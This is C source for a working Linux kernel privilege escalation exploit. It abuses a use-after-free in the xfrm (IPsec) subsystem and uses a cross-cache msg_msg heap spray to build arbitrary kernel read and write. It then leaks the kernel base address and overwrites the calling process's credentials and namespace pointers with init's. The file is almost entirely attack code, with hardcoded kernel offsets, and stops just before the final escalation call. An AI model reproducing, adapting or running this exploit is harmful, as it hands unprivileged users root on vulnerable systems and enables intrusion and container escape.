#define _GNU_SOURCE

#include <assert.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/netlink.h>
#include <linux/prctl.h>
#include <linux/xfrm.h>
#include <netinet/in.h>
#include <sched.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include <netlink/addr.h>
#include <netlink/errno.h>
#include <netlink/netlink.h>
#include <netlink/socket.h>
#include <netlink/xfrm/sa.h>
#include <netlink/xfrm/selector.h>

#pragma clang diagnostic ignored "-Wmissing-prototypes"
#pragma clang diagnostic ignored "-Wdeclaration-after-statement"


typedef uint8_t  u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t  i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;

// Big endian integers
typedef u8  be8;
typedef u16 be16;
typedef u32 be32;
typedef u64 be64;

// Leaked kernel pointers
typedef intptr_t kptr;


// ============= Kernel constants =============================================

// from /include/linux/math.h 
#define DIV_ROUND_UP(n, d) (((n) + (d) - 1) / (d))

#define PAGE_SIZE (0x1000)

// struct msg_msg
#define MSG_MSG_SIZE (0x30)
#define DATALEN_MSG	((size_t)PAGE_SIZE-MSG_MSG_SIZE)

// struct xfrm_state
#define XFRM_STATE_SIZE (736)
#define XFRM_STATE_OFFS_XS_NET (  0)
#define XFRM_STATE_OFFS_BYSPI  ( 40)
#define XFRM_STATE_OFFS_REFCNT ( 72)
#define XFRM_STATE_OFFS_ID     ( 80)
#define XFRM_STATE_OFFS_KM     (184)
#define XFRM_STATE_OFFS_PROPS  (216)
#define XFRM_STATE_OFFS_COADDR (392)
#define XFRM_STATE_OFFS_TYPE   (688)

// struct task_struct
#define TASK_STRUCT_OFFS_TASKS     (1224)
#define TASK_STRUCT_OFFS_TGID      (1428)
#define TASK_STRUCT_OFFS_REAL_CRED (1904)
#define TASK_STRUCT_OFFS_CRED      (1912)
#define TASK_STRUCT_OFFS_COMM      (1928)
#define TASK_STRUCT_OFFS_FS        (1992)
#define TASK_STRUCT_OFFS_NSPROXY   (2016)

// xfrm_state has a dedicated cache
#define XFRM_STATE_OBJS_PER_SLAB ( 21)  // /sys/kernel/slab/xfrm_state/objs_per_slab
#define XFRM_STATE_SLAB_ORDER    (  2)  // /sys/kernel/slab/xfrm_state/order
#define XFRM_STATE_SLAB_SIZE     (768)  // /sys/kernel/slab/xfrm_state/slab_size
#define XFRM_STATE_MIN_PARTIAL   (  5)  // /sys/kernel/slab/xfrm_state/min_partial
#define XFRM_STATE_CPU_PARTIAL   ( 52)  // /sys/kernel/slab/xfrm_state/cpu_partial
#define XFRM_STATE_CPU_PARTIAL_SLABS (                                 \
    DIV_ROUND_UP(XFRM_STATE_CPU_PARTIAL * 2, XFRM_STATE_OBJS_PER_SLAB) \
)

// struct xfrm_address_t
#define XFRM_ADDRESS_T_SIZE (16)

// Kernel image symbols
#define KERNEL_BASE (0xffffffff80000000)
#define ADDR_IPCOMP_TYPE   (0xffffffff82d9a460 - KERNEL_BASE)
#define ADDR_INIT_TASK     (0xffffffff83e0c940 - KERNEL_BASE)
#define ADDR_INIT_CRED     (0xffffffff83e72f20 - KERNEL_BASE)
#define ADDR_INIT_NSPROXY  (0xffffffff83e72a40 - KERNEL_BASE)
#define ADDR_INIT_FS       (0xffffffff83fae400 - KERNEL_BASE)

// ============= Kernel structs ===============================================

struct hlist_node {
	struct hlist_node *next, **pprev;
};

struct list_head {
	struct list_head *next, *prev;
};

enum {
	XFRM_STATE_VOID,
	XFRM_STATE_ACQ,
	XFRM_STATE_VALID,
	XFRM_STATE_ERROR,
	XFRM_STATE_EXPIRED,
	XFRM_STATE_DEAD
};

struct xfrm_state_walk {
	struct list_head	all;
	u8			state;
	u8			dying;
	u8			proto;
	u32			seq;
	struct xfrm_address_filter *filter;
};

// Anonymous struct for xfrm_state.props
struct xfrm_state_props {
    u32		reqid;
    u8		mode;
    u8		replay_window;
    u8		aalgo, ealgo, calgo;
    u8		flags;
    u16		family;
    xfrm_address_t	saddr;
    int		header_len;
    int		enc_hdr_len;
    int		trailer_len;
    u32		extra_flags;
    struct xfrm_mark	smark;
};


// ============= Exploit config ===============================================

// These constants might need to be tweaked for differnet targets.

// Constants for cross-cache-spray:

#define NUM_SPRAY_QUEUES1 (100) // number of sprayed messages for cross-cache-spray
#define NUM_SPRAY_QUEUES2 (20) // number of sprayed messages for same-cache-spray

// During the exploit we need to add 2*XFRM_STATE_CPU_PARTIAL_SLABS slabs to the
// kmemcache.cpu_slab[i]->partial list of the xfrm_state cache (in addition to the slab
// containing vuln_sa).
#define NUM_CPU_PARTIAL_SAS (2 * XFRM_STATE_CPU_PARTIAL_SLABS * XFRM_STATE_OBJS_PER_SLAB)
static_assert(NUM_CPU_PARTIAL_SAS > XFRM_STATE_MIN_PARTIAL*XFRM_STATE_OBJS_PER_SLAB);

// Fills one more slab after the UAF object.
#define NUM_POST_ALLOC_SAS (XFRM_STATE_OBJS_PER_SLAB)

// The kmalloc-cg cache size that uses the same order pages as the xfrm_state cache
// This constant depends on the number of CPU cores the target has!
#define TARGET_KMEMCACHE_SIZE (1024)

// Every fourth slot in a xfrm_state slab is aligned to a slot in kmalloc-1gc, because of
// 4*XFRM_STATE_SLAB_SIZE == TARGET_KMEMCACHE_SIZE
// We assume our xfrm_state was allocated into slot 4*n+3 for some value n.
// This offset is the difference between the address of the slot in the kmalloc-1gc slab
// to the address of the slot in xfrm_state slots.
#define MSG_MSG_TO_XFRM_STATE_OFFSET ((3*XFRM_STATE_SLAB_SIZE)%TARGET_KMEMCACHE_SIZE)

// Spraying a message of length SPRAY_MSG_LEN will overwrite all the fields of our UAF object up to and including `.coaddr`.
#define SPRAY_MSG_SIZE (MSG_MSG_TO_XFRM_STATE_OFFSET + XFRM_STATE_OFFS_COADDR + sizeof(xfrm_address_t *))
static_assert(SPRAY_MSG_SIZE > TARGET_KMEMCACHE_SIZE / 2);
static_assert(SPRAY_MSG_SIZE <= TARGET_KMEMCACHE_SIZE);
#define SPRAY_MSG_LEN (SPRAY_MSG_SIZE - MSG_MSG_SIZE)

// Convert from an offset into the UAF object to an offset into the sprayed message.
#define OBJ_OFFSET_TO_MSG_OFFSET(offset) (-MSG_MSG_SIZE + MSG_MSG_TO_XFRM_STATE_OFFSET + offset)
#define MIN_OBJ_OFFSET (0)
#define MAX_OBJ_OFFSET (XFRM_STATE_OFFS_COADDR + sizeof(xfrm_address_t))

// An arbitrary value for msgbuf.mtype
#define MSG_TYPE (1)

// We can read or write the struct xfrm_address_t pointed to by xfrm_state.coaddr
#define ARBITRARY_READ_SIZE (XFRM_ADDRESS_T_SIZE)
#define ARBITRARY_WRITE_SIZE (XFRM_ADDRESS_T_SIZE)

// An SPI that hashes to the same bucket in the byspi hashtable as the UAF object.
// Assuming the hash table has less than 1<<26 buckets.
#define SAME_BUCKET_SPI ((1<<26) | (1<<16))

// An arbitrary SPI. The lower 16 bits need to be zero for IPPROTO_COMP.
#define SOME_VALID_SPI (((u32)-1) << 16)

// usleep is called every time these constants are used.
#define MILLISECONDS (1000)
#define SECONDS (1000*MILLISECONDS)

// Exit codes for the child process
#define EXPLOIT_SUCCESSFUL (0)
#define EXPLOIT_FAILED (1)
#define EXPLOIT_PANICKED (2)

struct {
    int spray_queues1[NUM_SPRAY_QUEUES1];
    int spray_queues2[NUM_SPRAY_QUEUES2];
    int target_queue;  // The queue that hit our UAF object during cross-cache-spray
    bool vuln_sa_is_allocated;
    struct xfrmnl_sa *vuln_sa;  // The xfrm_state that we UAF
    struct xfrmnl_sa *prev_sa;  // Another xfrm_state for the R/W primitive
    kptr prev_sa_addr;
    struct xfrmnl_sa *cpu_partial_sas[NUM_CPU_PARTIAL_SAS];
    struct xfrmnl_sa *post_alloc_sas[NUM_POST_ALLOC_SAS];
    struct nl_addr *daddr;
    struct nl_addr *saddr;
    struct nl_sock *netlink;
} exploit_data = {0};

typedef struct {
    long mtype;
    char mtext[SPRAY_MSG_LEN];
} spray_msgbuf;

// ========== Helper functions ================================================

#define _LOG(prefix, format, ...) do { \
    printf(prefix format "\n" __VA_OPT__(,) __VA_ARGS__); \
} while(0)

#define LOG(...)   _LOG("[+] ", __VA_ARGS__)
#define LOG_W(...) _LOG("[-] ", __VA_ARGS__)

void panic(const char *message) __attribute__ ((noreturn));
void panic(const char *message)
{
    if (errno)
        _LOG("[!] ", "%s: %s\n", message, strerror(errno));
    else
        _LOG("[!] ", "%s\n", message);
    exit(EXPLOIT_PANICKED);
}

int check_error(int error_code, const char *message)
{
    if (error_code < 0)
        panic(message);

    return error_code;
}

void write_file(const char *file, const char *what, ...) {
    char buf[1024];
    int fd;

    va_list args;
    va_start(args, what);
    vsnprintf(buf, sizeof(buf), what, args);
    va_end(args);
    buf[sizeof(buf) - 1] = 0;
    int len = strlen(buf);

    LOG("Writing to file %s", file);

    check_error(fd = open(file, O_WRONLY | O_CLOEXEC), "open file");
    if (write(fd, buf, len) != len) {
        close(fd);
        panic("write file");
    }
    close(fd);
}

void dump_file(const char* file) {
    int fd;
    char buf[1024];
    size_t bytes_read;

    check_error( fd = open(file, O_RDONLY | O_CLOEXEC), "open file" );
    do {
        check_error( bytes_read = read(fd, buf, sizeof(buf)) , "read" );
        check_error( write(STDOUT_FILENO, buf, bytes_read) , "write" );
    } while (bytes_read > 0);
}

// ========== msg_msg helpers =================================================

int make_queue()
{
    int result = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    check_error(result, "make_queue");
    return result;
}

void free_queue(int queue)
{
    if (queue >= 0)
        msgctl(queue, IPC_RMID, NULL);
}

void peek_queue(int msqid, void* msgp, size_t msgsz, long msgidx)
{
    int err = msgrcv(msqid, msgp, msgsz, msgidx, MSG_COPY | IPC_NOWAIT);
    check_error(err, "peek_queue");
}

void peek_queue_first_msg(int msqid, void* msgp, size_t msgsz)
{
    return peek_queue(msqid, msgp, msgsz, 0);
}

// ========== Netlink helper ==================================================

void check_error_nl(int error_code, const char *message)
{
    if(error_code < 0) {
        fprintf(stderr, "[!] ");
        nl_perror(error_code, message);
        exit(EXPLOIT_PANICKED);
    }
}

// ========== Setup ===========================================================

void setup_unshare(uid_t uid, gid_t gid) {
    check_error(unshare(CLONE_NEWNS | CLONE_NEWNET | CLONE_NEWUSER), "unshare");

    write_file("/proc/self/setgroups", "deny");
    write_file("/proc/self/uid_map", "0 %d 1", uid);
    write_file("/proc/self/gid_map", "0 %d 1", gid);
}

void setup_pin_cpu(int cpu) {
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(cpu, &my_set);
    if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
        panic("sched_setaffinity()");
    }
}

void setup_netlink()
{
    exploit_data.netlink = nl_socket_alloc();
    if (!exploit_data.netlink)
        panic("nl_socket_alloc");

    check_error_nl(
        nl_connect(exploit_data.netlink, NETLINK_XFRM),
        "nl_connect"
    );
}

void setup()
{
    setup_unshare(getuid(), getgid());  // Step 1
    setup_pin_cpu(0); // Step 2

    for (int i=0; i<NUM_SPRAY_QUEUES1; i++)
        exploit_data.spray_queues1[i] = make_queue();

    for (int i=0; i<NUM_SPRAY_QUEUES2; i++)
        exploit_data.spray_queues2[i] = make_queue();

    setup_netlink(); // Step 3

    nl_addr_parse("6.6.6.6", AF_INET, &exploit_data.daddr);
    nl_addr_parse("7.7.7.7", AF_INET, &exploit_data.saddr);
}

// ========== Cleanup =========================================================

void cleanup()
{
    for (int i=0; i<NUM_SPRAY_QUEUES1; i++)
        free_queue(exploit_data.spray_queues1[i]);

    for (int i=0; i<NUM_SPRAY_QUEUES2; i++)
        free_queue(exploit_data.spray_queues2[i]);

    if (exploit_data.netlink) {
        nl_close(exploit_data.netlink);
        nl_socket_free(exploit_data.netlink);
    }

    nl_addr_put(exploit_data.daddr);
    nl_addr_put(exploit_data.saddr);

    // xfrm_state objects get cleaned implicitly when our net namespace gets deleted.
}

// ========== XFRM helpers ====================================================

/// Triggers the bug in xfrm_alloc_spi, if spi==0.
struct xfrmnl_sa *alloc_spi(int spi, struct nl_addr *daddr)
{
    struct nl_sock *sk = exploit_data.netlink;
    struct nl_object *result;

    struct xfrm_userspi_info body = {
        .min = ntohl(spi),
        .max = ntohl(spi),
        .info = {0}
    };

    body.info.family = AF_INET;
    body.info.id.proto = IPPROTO_COMP;
    body.info.id.daddr.a4 = *(be32*)nl_addr_get_binary_addr(daddr);
    body.info.saddr.a4 = *(be32*)nl_addr_get_binary_addr(exploit_data.saddr);
    body.info.mode = XFRM_MODE_TRANSPORT;

    check_error_nl( nl_send_simple(sk, XFRM_MSG_ALLOCSPI, 0, &body, sizeof(body)), "allocspi" );
    check_error_nl( nl_pickup(sk, &xfrm_sa_msg_parser, &result), "alloc_spi: pickup" );
    check_error_nl( nl_wait_for_ack(sk), "alloc_spi: wait ack" );

    return (struct xfrmnl_sa *)result;
}


/// Helper function to create an xfrmnl_sa struct. Does not trigger kernel code.
struct xfrmnl_sa *create_userspace_sa(int spi, struct nl_addr *daddr)
{
    struct xfrmnl_sa *sa = xfrmnl_sa_alloc();
    struct xfrmnl_sel *sel = xfrmnl_sel_alloc();

    xfrmnl_sa_set_proto(sa, IPPROTO_COMP);
    xfrmnl_sa_set_spi(sa, ntohl(spi));
    xfrmnl_sa_set_daddr(sa, daddr);
    xfrmnl_sa_set_saddr(sa, exploit_data.saddr);

    xfrmnl_sa_set_family(sa, AF_INET);
    xfrmnl_sa_set_comp_params(sa, "deflate", 0, NULL);
    xfrmnl_sa_set_mode(sa, XFRM_MODE_TRANSPORT);

    xfrmnl_sel_set_daddr(sel, daddr);
    xfrmnl_sel_set_saddr(sel, exploit_data.saddr);
    xfrmnl_sel_set_family(sel, AF_INET);
    xfrmnl_sa_set_sel(sa, sel);

    xfrmnl_sel_put(sel);

    return sa;
}

struct xfrmnl_sa *add_sa(int spi, struct nl_addr *daddr)
{
    struct nl_sock *sk = exploit_data.netlink;

    struct xfrmnl_sa *sa = create_userspace_sa(spi, daddr);
    check_error_nl( xfrmnl_sa_add(sk, sa, 0), "add" );

    return sa;
}

int delete_sa_no_check(struct xfrmnl_sa *sa)
{
    int err;
    struct nl_sock *sk = exploit_data.netlink;

    if (!sa)
        return 0;

    err = xfrmnl_sa_delete(sk, sa, 0);
    xfrmnl_sa_put(sa);

    return err;
}

void delete_sa(struct xfrmnl_sa *sa)
{
    check_error_nl( delete_sa_no_check(sa), "delete_sa" );
}

struct xfrmnl_sa *get_sa_by_spi(int spi, struct nl_addr *daddr)
{
    struct nl_sock *sk = exploit_data.netlink;
    struct xfrmnl_sa *result;
    int err;

    err = xfrmnl_sa_get_kernel(sk, daddr, ntohl(spi), IPPROTO_COMP, 0, 0, &result);
    check_error_nl(err, "get_sa");

    return result;
}

struct xfrmnl_sa *get_sa(struct xfrmnl_sa *sa)
{
    return get_sa_by_spi(htonl(xfrmnl_sa_get_spi(sa)), xfrmnl_sa_get_daddr(sa));
}

void update_sa(struct xfrmnl_sa *sa)
{
    struct nl_sock *sk = exploit_data.netlink;
    int err = xfrmnl_sa_update(sk, sa, 0);
    check_error_nl(err, "update_sa");
}

struct nl_addr *read_coaddr(struct xfrmnl_sa *sa)
{
    assert(sa);
    struct xfrmnl_sa *read_sa = get_sa(sa);
    if (!read_sa)
        panic("read_sa = (nil)");

    struct nl_addr *coaddr = xfrmnl_sa_get_coaddr(read_sa);
    if (!coaddr)
        panic("coaddr = (nil)");
    nl_addr_get(coaddr);

    xfrmnl_sa_put(read_sa);

    return coaddr;
}

void write_coaddr(struct xfrmnl_sa *sa, struct nl_addr *coaddr)
{
    xfrmnl_sa_set_coaddr(sa, coaddr);
    update_sa(sa);
}

// ========== Cross-Cache spray ===============================================


void fill_xfrm_state_cpu_partial()
{
    u32 base_addr_uint = *(u32*)nl_addr_get_binary_addr(exploit_data.daddr);
    for (int i=0; i<NUM_CPU_PARTIAL_SAS; i++)
    {
        u32 daddr_uint = base_addr_uint + i + 1;
        struct nl_addr *new_daddr = nl_addr_build(AF_INET, &daddr_uint, sizeof(daddr_uint));
        exploit_data.cpu_partial_sas[i] = add_sa(SOME_VALID_SPI, new_daddr);
        assert(exploit_data.cpu_partial_sas[i]);
        nl_addr_put(new_daddr);

        // Without this sleep, the hash table contain more than net->xfrm.state_hmask entries,
        // which might lead to rehashes during the later stages of the exploit.
        // @sleep(kernel_func="xfrm_hash_grow_check",
        //        desc="Ensure, that hash table has a chance to rehash")
        usleep(1*MILLISECONDS);
    }
}

void fill_xfrm_state_active_slab()
{
    u32 base_addr_uint = *(u32*)nl_addr_get_binary_addr(exploit_data.daddr);
    for (int i=0; i<NUM_POST_ALLOC_SAS; i++)
    {
        u32 daddr_uint = base_addr_uint - i - 1;
        struct nl_addr *new_daddr = nl_addr_build(AF_INET, &daddr_uint, sizeof(daddr_uint));
        exploit_data.post_alloc_sas[i] = add_sa(SOME_VALID_SPI, new_daddr);
        nl_addr_put(new_daddr);
    }
}

void free_xfrm_state_cpu_partial_one_per_slab(int objs_to_free)
{
    for (int i=0; i<NUM_CPU_PARTIAL_SAS; i+=XFRM_STATE_OBJS_PER_SLAB) {
        if (!exploit_data.cpu_partial_sas[i])
            continue;

        delete_sa(exploit_data.cpu_partial_sas[i]);
        exploit_data.cpu_partial_sas[i] = NULL;
        objs_to_free--;
        if (!(objs_to_free))
            return;
    }
    assert(false);
}

void free_xfrm_state_active_slab()
{
    for (int i=0; i<NUM_POST_ALLOC_SAS; i++) {
        assert(exploit_data.post_alloc_sas[i]);
        delete_sa(exploit_data.post_alloc_sas[i]);
        exploit_data.post_alloc_sas[i] = NULL;
    }
}

void spray_zeros_kmalloc_cg_1k()
{
    spray_msgbuf msg = { .mtype=1, .mtext={0} };

    for (int i=0; i<NUM_SPRAY_QUEUES1; i++)
    {
        int result = msgsnd(exploit_data.spray_queues1[i], &msg, sizeof(msg.mtext), 0);
        check_error(result, "msgsnd");
    }
}

void spray_cross_cache_xfrm_state_to_kmalloc_gc_1k_prepare() {
    LOG("Fill cpu_partial slabs");
    fill_xfrm_state_cpu_partial();

    LOG("Create vuln SA with SPI 0");
    // @sleep(kernel_func="xfrm_hash_resize", desc="Ensure that rehashing has finished.")
    usleep(300*MILLISECONDS);
    exploit_data.vuln_sa = alloc_spi(0, exploit_data.daddr);
    exploit_data.vuln_sa_is_allocated = true;

    LOG("Create post alloc SAs.");
    fill_xfrm_state_active_slab();

    LOG("Free one SA per slab to flush cpu_partial list");
    free_xfrm_state_cpu_partial_one_per_slab(XFRM_STATE_CPU_PARTIAL_SLABS+1);

    LOG("Sleep to ensure GC ran");
    // @sleep(kernel_func="___xfrm_state_destroy",
    //        desc="Ensure, that garbage collection has run in kworker thread.")
    usleep(10*MILLISECONDS);
}

void vuln_trigger() {
    LOG("Create another SA for the R/W primitive and free vuln SA");
    // This add_sa will delete the vuln SA, because the SAs look identical except for the spi and
    // the vuln SA looks like an SA waiting for an SPI (vuln_sa.state == XFRM_STATE_ACQ && vuln_sa.id.spi == 0)
    // c.f. xfrm_state_add and __find_acq_core
    exploit_data.prev_sa = add_sa(SAME_BUCKET_SPI, exploit_data.daddr);
    exploit_data.vuln_sa_is_allocated = false;
}

void spray_cross_cache_xfrm_state_to_kmalloc_gc_1k_execute() {
    LOG("Sleep to ensure GC ran");
    // @sleep(kernel_func="___xfrm_state_destroy",
    //        desc="Ensure, that garbage collection has run in kworker thread.")
    usleep(10*MILLISECONDS);

    LOG("Free post alloc SAs");
    free_xfrm_state_active_slab();

    LOG("Sleep to ensure GC ran");
    // @sleep(kernel_func="___xfrm_state_destroy",
    //        desc="Ensure, that garbage collection has run in kworker thread.")
    usleep(30*MILLISECONDS);

    LOG("Free one SA per slab to flush cpu_partial list");
    free_xfrm_state_cpu_partial_one_per_slab(XFRM_STATE_CPU_PARTIAL_SLABS-1);
    LOG("Sleep to ensure GC ran");
    // @sleep(kernel_func="___xfrm_state_destroy",
    //        desc="Ensure, that garbage collection has run in kworker thread.")
    usleep(30*MILLISECONDS);

    LOG("Spray msg_msg");
    spray_zeros_kmalloc_cg_1k();
}

bool check_sprayed_messages()
{
    // We wrote to the byspi.pprev field of our UAF xfrm_state, after spraying msg_msg.
    // Check which queue hit the UAF object.

    spray_msgbuf msg;

    for (int queue_idx=0; queue_idx < NUM_SPRAY_QUEUES1; queue_idx++) {
        peek_queue_first_msg(exploit_data.spray_queues1[queue_idx], &msg, SPRAY_MSG_LEN);

        kptr pprev = 0;

        // Every forth slot_idx will result in the same offset_in_msg_slot, so we only need to check 
        // the first 4 values.
        for (int slot_idx=0; slot_idx < 4; slot_idx++) {
            size_t offset_in_msg_slot = (slot_idx*XFRM_STATE_SLAB_SIZE) % TARGET_KMEMCACHE_SIZE;
            size_t pprev_offset = offset_in_msg_slot + XFRM_STATE_OFFS_BYSPI + offsetof(struct hlist_node, pprev);

            assert(pprev_offset >= MIN_OBJ_OFFSET);
            if (pprev_offset+sizeof(kptr) > SPRAY_MSG_LEN)
                continue;

            pprev = *(kptr*)&msg.mtext[pprev_offset-MSG_MSG_SIZE];
            if (pprev) {
                LOG("queue_idx=%d", queue_idx);
                LOG("slot_idx=%d", slot_idx);

                // Our exploit strategy only works, if we hit a slot that has index 4*n+3.
                // If we did not get lucky here, the exploit just retries from the start.
                if (slot_idx != 3)
                    return false;
                break;
            }
        }

        if (!pprev)
            continue;

        // We found the correct queue.
        LOG("pprev = 0x%zx", pprev);
        exploit_data.prev_sa_addr = pprev - offsetof(struct hlist_node, next) - XFRM_STATE_OFFS_BYSPI;
        exploit_data.target_queue = exploit_data.spray_queues1[queue_idx];
        return true;
    }

    // Depending on which slot of the slab `vuln_sa` ended up in, we might not find the pprev pointer at all.
    // In this case, the exploit just retries from the start, too.
    return false;
}

// ========== Arbitrary R/W ===================================================

void spray_fake_xfrm_state()
{
    spray_msgbuf msg = { .mtype=1, .mtext={0} };
    kptr prev_sa_addr = exploit_data.prev_sa_addr;

    #define WRITE(type, offset, value)  do {                                \
        assert(offset >= MIN_OBJ_OFFSET);                                   \
        assert(offset + sizeof(type) <= MAX_OBJ_OFFSET);                    \
        *(type*)(&msg.mtext[OBJ_OFFSET_TO_MSG_OFFSET(offset)]) = (value);   \
    } while(0)

    // Keep byspi hlist intact
    WRITE(
        kptr,
        XFRM_STATE_OFFS_BYSPI + offsetof(struct hlist_node, pprev),
        prev_sa_addr + XFRM_STATE_OFFS_BYSPI + offsetof(struct hlist_node, next)
    );

    // Target the previous SA's coaddr with our read/write primitive to
    // allow read/write at arbitrary addresses.
    WRITE(kptr, XFRM_STATE_OFFS_COADDR, prev_sa_addr + XFRM_STATE_OFFS_COADDR);

    // These fields are needed to make __xfrm_state_lookup return this object.
    WRITE( u64, XFRM_STATE_OFFS_REFCNT, 12345);  // Arbitrary positive value
    WRITE( u16, XFRM_STATE_OFFS_PROPS + offsetof(struct xfrm_state_props, family), AF_INET);
    WRITE(be32, XFRM_STATE_OFFS_ID + offsetof(struct xfrm_id, spi), 0);
    WRITE(  u8, XFRM_STATE_OFFS_ID + offsetof(struct xfrm_id, proto), IPPROTO_COMP);
    WRITE(be32, XFRM_STATE_OFFS_ID + offsetof(struct xfrm_id, daddr), *(be32*)nl_addr_get_binary_addr(exploit_data.daddr));

    // This field is needed to pass the check `x1->km.state == XFRM_STATE_VALID` in xfrm_update
    WRITE(u8, XFRM_STATE_OFFS_KM + offsetof(struct xfrm_state_walk, state), XFRM_STATE_VALID);

    #undef WRITE

    // msgsnd needs to reuse the msg_msg freed by msgrcv.
    spray_msgbuf rcv_msg;
    msgrcv(exploit_data.target_queue, &rcv_msg, SPRAY_MSG_LEN, MSG_TYPE, 0);

    for (int i=0; i<NUM_SPRAY_QUEUES2; i++)
        msgsnd(exploit_data.spray_queues2[i], &msg, SPRAY_MSG_LEN, 0);

    // Update our userspace struct
    xfrmnl_sa_put(exploit_data.vuln_sa);
    exploit_data.vuln_sa = create_userspace_sa(0, exploit_data.daddr);
}

void set_rw_target(kptr addr)
{
    struct nl_addr *coaddr = nl_addr_build(AF_INET, &addr, sizeof(addr));
    write_coaddr(exploit_data.vuln_sa, coaddr);
    nl_addr_put(coaddr);
}

void arbitrary_read(kptr addr, void *buf, size_t len)
{
    assert(len <= ARBITRARY_READ_SIZE);

    set_rw_target(addr);
    struct nl_addr *coaddr = read_coaddr(exploit_data.prev_sa);
    memcpy(buf, nl_addr_get_binary_addr(coaddr), len);
    nl_addr_put(coaddr);
}

void arbitrary_write(kptr addr, void *buf, size_t len)
{
    assert(len <= ARBITRARY_WRITE_SIZE);

    set_rw_target(addr);

    // We always have to write 16 byte chunks. For shorter writes we leak
    // 16 bytes at addr and write back the data we don't want to change.
    char old_data[ARBITRARY_WRITE_SIZE] = {0};
    if (len < ARBITRARY_WRITE_SIZE) {
        struct nl_addr *old_coaddr = read_coaddr(exploit_data.prev_sa);
        memcpy(old_data, nl_addr_get_binary_addr(old_coaddr), ARBITRARY_WRITE_SIZE);
    }

    memcpy(old_data, buf, len);
    struct nl_addr *new_coaddr = nl_addr_build(AF_INET6, old_data, ARBITRARY_WRITE_SIZE);
    write_coaddr(exploit_data.prev_sa, new_coaddr);
    nl_addr_put(new_coaddr);
}

u32 arbitrary_read_u32(intptr_t addr) {
    u32 value;
    arbitrary_read(addr, (void*)&value, sizeof(u32));
    return value;
}

kptr arbitrary_read_kptr(intptr_t addr) {
    kptr value;
    arbitrary_read(addr, (void*)&value, sizeof(kptr));
    return value;
}

void arbitrary_write_kptr(intptr_t addr, kptr value) {
    arbitrary_write(addr, (void*)&value, sizeof(kptr));
}

kptr search_our_task_struct(kptr kernel_base) {
    kptr init_task_addr = kernel_base + ADDR_INIT_TASK;
    kptr task_addr = init_task_addr;

    prctl(PR_SET_NAME, (unsigned long)"exploit_child", 0, 0, 0);

    do {
        char comm[16];
        arbitrary_read(task_addr + TASK_STRUCT_OFFS_COMM, comm, sizeof(comm));
        LOG("comm = %s", comm);

        if (0 == strcmp(comm, "exploit_child"))
            return task_addr;

        // task_tasks_prev_addr = &task_addr->tasks.prev
        kptr task_tasks_prev_addr = task_addr
            + TASK_STRUCT_OFFS_TASKS
            + offsetof(struct list_head, prev);

        task_addr = arbitrary_read_kptr(task_tasks_prev_addr) - TASK_STRUCT_OFFS_TASKS;

    } while (task_addr != init_task_addr);

    panic("Could not find our task_struct");
}

void escalate_privs(kptr task_addr, kptr kernel_base)
{
    // This is the lazy way to escalate privs.
    // It will overdecrement the refcounts on process exit.
    // For a clean implementation, instead of editing the pointers
    // edit the structs these pointers point to.

    #define SET(FIELD_NAME, TASK_OFF, ADDR) do {                      \
        LOG("Overwriting task_struct.%s", FIELD_NAME);                \
        LOG("Before: %lx", arbitrary_read_kptr(task_addr+TASK_OFF));  \
        arbitrary_write_kptr(task_addr+TASK_OFF, kernel_base+ADDR);   \
        LOG("After: %lx", arbitrary_read_kptr(task_addr+TASK_OFF));   \
    } while (0)

    SET("real_cred", TASK_STRUCT_OFFS_REAL_CRED, ADDR_INIT_CRED);
    SET("cred", TASK_STRUCT_OFFS_CRED, ADDR_INIT_CRED);
    SET("fs", TASK_STRUCT_OFFS_FS, ADDR_INIT_FS);
    SET("nsproxy", TASK_STRUCT_OFFS_NSPROXY, ADDR_INIT_NSPROXY);
}

int run_once()
{
    // ========================= Setup ================================

    atexit(cleanup);

    // Steps 1-3
    setup();

    for (int i=0; i<1000; i++) {
        // @sleep(kernel_func="___xfrm_state_destroy",
        //        desc="Ensure, that xfrm_state objects from the previous run have been freed.")
        usleep(1*MILLISECONDS);
    }

    // ======== Cross-cache: UAF kcm_state to kmalloc-cg-1k ===========

    // The cross-cache spray is similar to
    // https://i.blackhat.com/Asia-24/Presentations/Asia-24-Wu-Game-of-Cross-Cache.pdf
    // Assume that noone else uses the xfrm_state cache and the cache starts empty.
    // If this is not true adjust the code to be more like the PDF.
    // E.g. increase NUM_CPU_PARTIAL_SAS and use pre-alloc SAs.

    // Step 4
    spray_cross_cache_xfrm_state_to_kmalloc_gc_1k_prepare();

    // Step 5
    vuln_trigger(); // Frees vuln object for cross-cache-spray

    // Step 6
    spray_cross_cache_xfrm_state_to_kmalloc_gc_1k_execute();

    // =================== Prepare arbitrary R/W primitive ============

    // Step 7
    LOG("Free and recreate prev SA to repair byspi hlist");
    delete_sa(exploit_data.prev_sa);
    exploit_data.prev_sa = add_sa(SAME_BUCKET_SPI, exploit_data.daddr);

    LOG("Sleep to ensure GC ran");
    // @sleep(kernel_func="___xfrm_state_destroy",
    //        desc="Ensure, that garbage collection has run in kworker thread.")
    usleep(1*MILLISECONDS);

    // Step 8
    LOG("Check sprayed messages");
    if (!check_sprayed_messages())
        return EXPLOIT_FAILED;

    // Step 9
    LOG("Spray fake xfrm_struct");
    spray_fake_xfrm_state();

    LOG("Testing arbitrary read");
    if (
        arbitrary_read_u32(
            exploit_data.prev_sa_addr + XFRM_STATE_OFFS_ID + offsetof(struct xfrm_id, spi)
        )
        != SAME_BUCKET_SPI
    )
        panic("Arbitrary read gave unexpected result");

    // ====================== Leak KASLR ==============================

    // Step 10
    LOG("Leaking ASLR offset");
    kptr type_addr = arbitrary_read_kptr(exploit_data.prev_sa_addr + XFRM_STATE_OFFS_TYPE);
    kptr kernel_base = type_addr - ADDR_IPCOMP_TYPE;
    LOG("kernel base = %lx", kernel_base);

    // ====================== Win :) ==================================

    // Step 11
    LOG("Searching for our task_struct...");
    kptr task = search_our_task_struct(kernel_base);
    LOG("Found task_struct: %lx", task);

    // Step 12
